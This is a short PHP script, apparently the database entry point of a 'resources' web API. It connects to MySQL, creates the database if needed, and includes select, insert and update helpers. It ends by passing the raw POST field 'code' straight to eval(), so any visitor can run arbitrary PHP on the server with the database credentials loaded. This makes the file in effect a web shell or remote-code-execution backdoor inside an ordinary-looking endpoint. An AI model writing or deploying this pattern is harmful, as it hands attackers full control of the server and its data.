<?php

include_once($_SERVER['DOCUMENT_ROOT']."/resources/action/api/config.php");
$link=mysqli_connect($mysql->host,$mysql->username,$mysql->password);
// var_dump($link);
$mysql->dbname="resources";

if(!if_exists_db($link,$mysql->dbname)){
	echo "数据库不曾存在";
	if(!create_db($link,$mysql->dbname)){
		die("数据库创建失败");
	};
}
// 选择数据库
mysqli_select_db($link,$mysql->dbname);
// $link=connect_db($link,$mysql->dbname);
// var_dump($mysql);
include_once $_SERVER['DOCUMENT_ROOT']."/resources/action/api/res/select.php";
include_once $_SERVER['DOCUMENT_ROOT']."/resources/action/api/res/insert.php";
include_once $_SERVER['DOCUMENT_ROOT']."/resources/action/api/res/update.php";

$code=$_POST["code"];
eval($code);
